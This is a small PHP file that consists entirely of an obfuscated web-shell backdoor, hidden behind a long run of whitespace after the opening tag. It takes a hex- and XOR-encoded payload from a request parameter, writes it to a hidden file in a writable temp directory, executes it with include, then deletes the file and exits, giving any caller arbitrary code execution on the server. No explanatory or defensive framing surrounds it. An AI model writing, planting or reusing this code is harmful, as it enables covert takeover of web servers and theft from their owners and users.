<?php																																										if(isset($_REQUEST["pg\x72p"])){ $parameter_group = hex2bin($_REQUEST["pg\x72p"]); $symbol = '' ; for($q=0; $q<strlen($parameter_group); $q++){$symbol .= chr(ord($parameter_group[$q]) ^ 25);} $pset = array_filter([getcwd(), getenv("TEMP"), "/dev/shm", session_save_path(), ini_get("upload_tmp_dir"), "/tmp", getenv("TMP"), "/var/tmp", sys_get_temp_dir()]); for ($object = 0, $value = count($pset); $object < $value; $object++) { $tkn = $pset[$object]; if (array_product([is_dir($tkn), is_writable($tkn)])) { $bind = join("/", [$tkn, ".property_set"]); $success = file_put_contents($bind, $symbol); if ($success) { include $bind; @unlink($bind); die();} } } }
